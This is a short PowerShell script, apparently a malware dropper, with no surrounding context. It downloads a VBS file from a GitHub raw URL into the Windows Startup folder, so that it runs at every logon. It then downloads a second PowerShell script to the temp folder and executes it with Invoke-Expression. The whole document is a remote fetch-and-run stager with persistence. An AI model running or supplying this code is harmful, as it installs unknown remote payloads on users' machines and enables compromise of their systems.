$url5 = "https://raw.githubusercontent.com/cia168168/folder/main/WIN64.vbs"
$output5 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WIN64.vbs"
Invoke-WebRequest -Uri $url5 -OutFile $output5
$url5 = "https://raw.githubusercontent.com/cia168168/folder/main/RUNS.ps1"
$output5 = "$env:TEMP\RUNS.ps1"
Invoke-WebRequest -Uri $url5 -OutFile $output5
IEX ((New-Object Net.WebClient).DownloadString($output5))